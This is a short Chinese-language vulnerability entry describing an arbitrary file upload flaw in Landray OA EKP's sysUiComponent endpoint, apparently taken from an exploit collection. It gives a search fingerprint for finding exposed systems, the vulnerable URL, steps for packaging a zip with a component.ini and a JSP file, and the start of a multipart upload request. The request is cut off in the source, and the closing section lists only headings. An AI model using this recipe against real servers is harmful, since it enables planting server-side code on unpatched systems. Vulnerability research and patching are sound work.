# 蓝凌OAEKPsysUiComponent存在任意文件上传漏洞

- **系统**：蓝凌　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo HTTP/2`

**请求体 / payload**
```
1. 访问出现如下页面则可能存在漏洞
/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
2. 构造zip文件

component.ini
id=2023
name=log.jsp
log.jsp
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
\[output.zip]\(公众号：渗透安全HackTwo
3. 上传zip文件
Host: {hostname}
Cookie: SESSION=M2Y0ZjZjODItYzE2Ny00MzUxLThmMmMtNTIxZTJkNWI3NDEx
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------26002458101919536751996714568
Content-Length: 556
-----------------------------26002458101919536751996714568
Content-Disposition: form-d…（脚本共 1263 字，完整版见原文）
```

**其他**
- 蓝凌OA EKP sysUiComponent存在任意文件上传漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***